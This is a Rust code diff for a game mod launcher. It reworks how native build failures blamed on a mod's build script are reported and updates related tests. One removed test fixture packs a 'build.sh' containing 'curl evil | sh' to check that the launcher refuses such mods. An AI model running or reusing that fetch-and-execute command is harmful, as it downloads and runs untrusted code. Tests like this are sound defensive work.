@@ -318,6 +318,8 @@ pub fn mixins_from_source(on: bool) {
 /// The failed build's error, led by its blamed mod in the launcher's own words, as [`compile_failed_mod`] and [`refused_mod`] read it.
 fn blamed_text(failed: tool::Failure) -> String {
     let lead = match failed.blame {
+        // A build script refused by a tool made before mods could run them: keep the tool's own
+        // error while preserving the blamed mod id for `failure_message`.
         None => {
             return trf(
                 "The native build failed: {error}",
@@ -326,12 +328,21 @@ fn blamed_text(failed: tool::Failure) -> String {
         }
         Some(tool::Blame {
             mod_id,
-            kind: tool::BlameKind::Compile,
-        }) => failure(&compiling_mod(&mod_id), tr("see the build log"), &[], &[]),
+            kind: tool::BlameKind::BuildScript,
+        }) => {
+            let error = if build_script_failed_mod(&failed.error, std::slice::from_ref(&mod_id))
+                .is_some()
+            {
+                failed.error
+            } else {
+                format!("E_NATIVE_BUILD_SCRIPT: {mod_id}: {}", failed.error)
+            };
+            return trf("The native build failed: {error}", &[("error", &error)]);
+        }
         Some(tool::Blame {
             mod_id,
-            kind: tool::BlameKind::BuildScript,
-        }) => Refusal::BuildScript { mod_id }.to_string(),
+            kind: tool::BlameKind::Compile,
+        }) => failure(&compiling_mod(&mod_id), tr("see the build log"), &[], &[]),
         Some(tool::Blame {
             mod_id,
             kind: tool::BlameKind::Features,
@@ -1037,17 +1048,27 @@ pub fn compile_failed_mod<'a>(error: &str, ids: &'a [String]) -> Option<&'a Stri
         .find(|id| error.contains(&format!("{} (", build_log::failed(&compiling_mod(id)))))
 }
 
-/// The mod among `ids` whose build script or features stopped the build `error` describes, and
-/// why: `error` holds that refusal word for word (the build log keeps it).
+/// The mod among `ids` whose features stopped the build `error` describes, and why: `error`
+/// holds that refusal word for word (the build log keeps it).
 pub fn refused_mod<'a>(error: &str, ids: &'a [String]) -> Option<(&'a String, Refusal)> {
     ids.iter().find_map(|id| {
-        [
-            Refusal::BuildScript { mod_id: id.clone() },
-            Refusal::Features { mod_id: id.clone() },
-        ]
-        .into_iter()
-        .find(|refusal| error.contains(&refusal.to_string()))
-        .map(|refusal| (id, refusal))
+        let refusal = Refusal::Features { mod_id: id.clone() };
+        error
+            .contains(&refusal.to_string())
+            .then_some((id, refusal))
+    })
+}
+
+/// The mod among `ids` whose build script an older SDK tool refused in `error`.
+pub fn build_script_failed_mod<'a>(error: &str, ids: &'a [String]) -> Option<&'a String> {
+    const CODE: &str = "E_NATIVE_BUILD_SCRIPT: ";
+    error.match_indices(CODE).find_map(|(at, _)| {
+        let rest = &error[at + CODE.len()..];
+        ids.iter().find(|id| {
+            rest.strip_prefix(id.as_str()).is_some_and(|after| {
+                after.is_empty() || after.starts_with(|c: char| c.is_ascii_whitespace() || c == ':')
+            })
+        })
     })
 }
 
@@ -4150,8 +4171,34 @@ mod tests {
         assert_eq!(found[0].native().sunrise, A);
     }
 
+    /// The tool of a game build made before mods could run build scripts still blames one: its
+    /// failure keeps the tool's own error while preserving the blamed mod id for `failure_message`.
     #[test]
-    fn flat_projects_use_manifest_identity_and_reject_old_roots() {
+    fn an_older_tools_build_script_blame_reads_as_its_error() {
+        let ids = ["script".to_string(), "scripted".to_string()];
+        let error = "E_NATIVE_BUILD_SCRIPT: scripted has a build script".to_string();
+        let blame: tool::Blame =
+            serde_json::from_str(r#"{"mod":"scripted","kind":"build-script"}"#).unwrap();
+        let shown = blamed_text(tool::Failure {
+            error: error.clone(),
+            blame: Some(blame.clone()),
+        });
+        assert_eq!(shown, format!("The native build failed: {error}"));
+        assert_eq!(build_script_failed_mod(&shown, &ids), Some(&ids[1]));
+
+        let custom = blamed_text(tool::Failure {
+            error: "a message in the tool's English".into(),
+            blame: Some(blame),
+        });
+        assert!(
+            custom.ends_with("a message in the tool's English"),
+            "{custom}"
+        );
+        assert_eq!(build_script_failed_mod(&custom, &ids), Some(&ids[1]));
+    }
+
+    #[test]
+    fn flat_projects_use_manifest_identity_and_read_old_root_names_as_files() {
         let root = dir("project-layout");
         write_native(&root, "example", A, B);
         assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.id, "example");
@@ -4168,6 +4215,7 @@ mod tests {
             project_manifest("example", "1", A, B),
         )
         .unwrap();
+        // Files the retired layouts named are ordinary project files now.
         for old in [
             "sunrise-native.json",
             "horizon-mixin.toml",
@@ -4175,7 +4223,11 @@ mod tests {
             "rust",
         ] {
             fs::write(root.join(old), "").unwrap();
-            assert!(bundle_in(&root).is_err(), "{old}");
+            assert_eq!(
+                bundle_in(&root).unwrap().unwrap().manifest.id,
+                "example",
+                "{old}"
+            );
             fs::remove_file(root.join(old)).unwrap();
         }
         fs::remove_dir_all(root).unwrap();
@@ -4260,8 +4312,8 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
-        assert!(stage().is_err(), "only Rust and TOML sources");
+        pack("veinminer.smod", Some(("vendor/lib.c", "\x7fELF\x02\x01")));
+        assert!(stage().is_err(), "prebuilt binaries are refused by content");
     }
 
     /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
@@ -4592,7 +4644,7 @@ mod tests {
         for (path, bytes) in [
             ("assets/exported/probe.txt", "asset"),
             ("data/exported/native/probe.json", "{}"),
-            ("jars/cache.jar", "not a project file"),
+            ("target/cache.jar", "not a project file"),
         ] {
             let path = project.join(path);
             fs::create_dir_all(path.parent().unwrap()).unwrap();
@@ -4675,7 +4727,7 @@ mod tests {
             fs::read(package.join("data/exported/native/probe.json")).unwrap(),
             b"{}"
         );
-        assert!(!package.join("jars").exists());
+        assert!(!package.join("target").exists());
         assert!(!output.join(native_dir).join("stale").exists());
         eprintln!("NATIVE_SERVER_EXPORT_STEP=load_runtime");
         let runtime = sunrise_launcher_smod::packages::adjacent_manifests(
